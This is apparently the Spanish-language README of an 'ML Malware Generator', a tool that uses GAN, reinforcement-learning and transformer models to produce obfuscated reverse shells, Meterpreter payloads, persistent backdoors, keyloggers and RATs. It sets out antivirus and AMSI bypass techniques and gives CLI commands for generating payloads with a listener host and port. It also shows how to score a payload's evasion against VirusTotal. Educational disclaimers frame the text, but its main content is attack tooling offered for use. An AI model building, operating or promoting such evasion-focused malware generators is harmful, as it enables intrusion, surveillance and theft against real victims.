# ML Malware Generator

Sistema de generación de malware usando Machine Learning, inspirado en TheFatRat, diseñado para investigación en ciberseguridad y red teaming.

## ⚠️ ADVERTENCIA

**SOLO PARA USO EDUCATIVO Y DE INVESTIGACIÓN**

Este proyecto está diseñado exclusivamente para:
- Investigación en ciberseguridad
- Pentesting autorizado
- Entornos de laboratorio controlados
- Educación en seguridad informática

El uso malicioso de este software es **ILEGAL** y **ÉTICAMENTE INACEPTABLE**.

## 🚀 Características

### Modelos de Machine Learning
- **GAN (Generative Adversarial Network)**: Genera variaciones ofuscadas de payloads
- **Reinforcement Learning**: Optimiza técnicas de evasión automáticamente
- **Transformer**: Genera shellcode polimórfico coherente

### Tipos de Payloads
- Reverse shells (TCP/HTTP/HTTPS)
- Meterpreter payloads
- Backdoors persistentes
- Keyloggers y RATs
- Soporte para Windows, Linux, Android

### Técnicas de Evasión
- Ofuscación de código multi-capa
- Cifrado de strings
- API hashing
- Encoding polimórfico
- Reducción de entropía
- Bypass de AMSI/AV

### Sistema de Detección
- Análisis estático local
- Integración con VirusTotal
- Cálculo de métricas de evasión
- Tests de funcionalidad

## 📦 Instalación

```bash
# Clonar repositorio
cd Taurus

# Instalar dependencias
pip install -r requirements.txt

# Verificar instalación
python cli.py info
```

## 🎯 Uso

### Generar Payload

```bash
# Reverse shell básico
python cli.py generate --type reverse_shell --target windows --lhost 192.168.1.10 --lport 4444 --output payload.exe

# Meterpreter con ofuscación ML
python cli.py generate --type meterpreter --target windows --lhost 192.168.1.10 --lport 4444 --ml-mode --obfuscation-level 5 --output meterpreter.exe

# Backdoor persistente
python cli.py generate --type backdoor --target windows --lhost 192.168.1.10 --lport 4444 --output backdoor.exe
```

### Evaluar Payload

```bash
# Análisis local
python cli.py evaluate --payload payload.exe --local-only

# Análisis con VirusTotal
python cli.py evaluate --payload payload.exe --virustotal
```

### Entrenar Modelos

```bash
# Entrenar agente RL
python cli.py train --model rl --timesteps 100000

# Entrenar todos los modelos
python cli.py train --model all --epochs 100
```

## 🏗️ Arquitectura

```
Taurus/
├── cli.py                      # Interfaz de línea de comandos
├── ml_engine.py                # Motor principal ML
├── config/
│   └── settings.py             # Configuración del sistema
├── models/
│   ├── gan_generator.py        # Modelo GAN
│   ├── rl_evasion.py          # Agente RL
│   └── transformer_shellcode.py # Modelo Transformer
├── generators/
│   └── payload_factory.py      # Generador de payloads
├── obfuscation/
│   └── obfuscator.py          # Sistema de ofuscación
├── testing/
│   └── detector.py            # Sistema de detección
└── utils/
    ├── logger.py              # Sistema de logging
    └── crypto.py              # Utilidades criptográficas
```

## 🔒 Controles de Seguridad

- **Watermarking**: Todos los payloads incluyen marca de agua identificable
- **Logging Obligatorio**: Registro de todas las generaciones
- **Kill Switch**: Mecanismo de desactivación remota
- **Environment Check**: Solo ejecuta en entornos autorizados

## 📊 Métricas

El sistema evalúa payloads con:
- **Detection Rate**: % de AV que detectan el payload
- **Stealth Score**: Nivel de evasión logrado
- **Functionality Score**: Si el payload funciona correctamente
- **Overall Score**: Puntuación combinada

## 🧪 Testing en Entorno Seguro

**IMPORTANTE**: Siempre prueba en máquinas virtuales aisladas:

```bash
# 1. Generar payload
python cli.py generate --type reverse_shell --target windows --lhost 192.168.1.10 --lport 4444 --output test.exe

# 2. Evaluar localmente
python cli.py evaluate --payload test.exe --local-only

# 3. Probar en VM aislada
# - Copiar test.exe a VM Windows
# - Iniciar listener en host
# - Ejecutar payload en VM
```

## 📝 Configuración

Edita `config/settings.py` para personalizar:

```python
# Configuración ML
ml_config.device = "cuda"  # o "cpu"
ml_config.gan_latent_dim = 128
ml_config.rl_algorithm = "PPO"

# Configuración de payloads
payload_config.obfuscation_level = 3
payload_config.enable_av_evasion = True

# VirusTotal (opcional)
detection_config.virustotal_api_key = "YOUR_API_KEY"
detection_config.virustotal_enabled = True
```

## 🔬 Investigación y Desarrollo

### Entrenar con Dataset Personalizado

```python
from ml_engine import get_ml_engine

ml_engine = get_ml_engine()

# Entrenar GAN con muestras
# ml_engine.train_all_models(gan_data=your_data)

# Entrenar RL
ml_engine.rl_agent.train(total_timesteps=100000)

# Guardar modelos
ml_engine.save_all_models("my_checkpoint")
```

## 📚 Recursos

- [TheFatRat](https://github.com/Screetsec/TheFatRat) - Inspiración original
- [Metasploit Framework](https://www.metasploit.com/) - Framework de pentesting
- [VirusTotal](https://www.virustotal.com/) - Análisis de malware

## ⚖️ Licencia y Ética

Este proyecto es solo para fines educativos y de investigación. El autor no se hace responsable del uso indebido de este software.

**Uso Responsable**:
- ✅ Investigación en ciberseguridad
- ✅ Pentesting autorizado
- ✅ Educación en seguridad
- ❌ Actividades maliciosas
- ❌ Uso no autorizado
- ❌ Distribución de malware

## 🤝 Contribuciones

Las contribuciones son bienvenidas para mejorar las capacidades de investigación del proyecto.

## 📧 Contacto

Para preguntas sobre investigación en ciberseguridad y uso ético del proyecto.

---

**Recuerda**: Con gran poder viene gran responsabilidad. Usa este conocimiento para defender, no para atacar.
